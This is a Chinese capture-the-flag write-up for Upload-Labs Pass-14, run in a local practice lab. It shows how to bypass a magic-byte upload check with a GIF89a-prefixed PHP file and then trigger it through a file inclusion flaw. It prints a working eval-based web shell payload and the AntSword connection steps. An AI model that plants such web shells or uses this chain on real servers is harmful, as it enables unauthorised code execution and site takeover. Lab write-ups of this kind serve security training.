【Upload-Labs】Pass-14 图片马与文件包含 Writeup

操作者：何芊宏 | 操作日期：2026.11.03 | 分类：CTF | 标签：Upload-Labs, Web, 文件上传, 图片马, 文件包含, WebShell

1. 题目信息

  • 平台：Upload-Labs (本地 phpStudy 环境)
  • 分类：Web - 文件上传
  • 题目名称：Pass-14 (文件头检测 + 文件包含)
  • 提示：任务要求上传图片马，并利用文件包含漏洞执行其中的恶意代码。

2. 核心原理与前置分析

上传检测：源码中的 getReailFileType() 函数只读取文件的前 2 个字节（文件头魔数，如 FF D8 为 JPG，47 49 为 GIF），以此判断是否为合法图片，不检查文件内容的完整性。

触发机制：靶场根目录下存在 include.php 文件，其代码为 include($_GET['file'])，存在任意文件包含漏洞。结合上传的图片马，可实现代码执行。

环境坑与避坑：使用 copy /b 1.jpg + shell.php shell_ma.jpg 拼接真实图片时，由于图片中存在大量二进制乱码，include.php 解析时会导致 PHP 引擎抛出 Parse error。必须改用纯文本的图片头（如 GIF89a）进行构造。

3. 工具配置与操作步骤

工具配置：中国蚁剑

  • URL 地址：http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif
  • 连接密码：cmd；编码：UTF-8。

操作步骤与解析：

第一步：制作纯文本图片马

新建一个文本文档，写入以下两行内容（以 UTF-8 无 BOM 格式保存）：

GIF89a
<?php @eval($_POST['cmd']); ?>

将其重命名为 shell.gif。

第二步：上传并获取真实文件名

在网页直接上传 shell.gif。服务器检测到 GIF89a 魔数并放行，随后重命名。在页面上右键点击图片，选择“复制图片地址”，提取出真实的上传路径。

第三步：利用包含漏洞触发与连接

在浏览器构造 URL 访问：http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif。页面呈现纯白（无报错），证明 PHP 代码执行成功。

使用蚁剑填入该包含 URL 及密码 cmd，测试连接成功，获取了 upload-labs 根目录的访问权限。

4. 踩坑记录与复盘

  • 二进制数据导致解析崩溃：尝试用 copy /b 拼接真实 JPG 和 PHP 代码，浏览器访问包含地址时抛出 Unexpected character in input 错误。原因在于 PHP 引擎在解析到图片乱码字节时发生了语法错误，无法执行后续的代码。纯文本的图片头完美解决了此问题。
  • 获取真实文件名：由于服务端对文件进行了重命名，直接猜解文件名会导致连接失败。利用浏览器“复制图片地址”功能，是获取真实路径最直观、最高效的方法。
  • 权限范围：通过 include.php 触发执行后，蚁剑连接的是靶场根目录 upload-labs。这是因为 include.php 的工作目录即为根目录，被包含的代码继承了此上下文。

5. 知识点总结

  • 图片马构造：利用文件头（Magic Bytes）欺骗服务端的白名单/类型检测。在 PHP 包含场景下，使用纯文本的 GIF89a 构建图片马比拼接真实图片更安全，不易触发解析错误。
  • 文件包含漏洞：通过 include 等函数引入恶意文件，使得非脚本文件（如按图片格式上传的文件）中的代码得以执行。
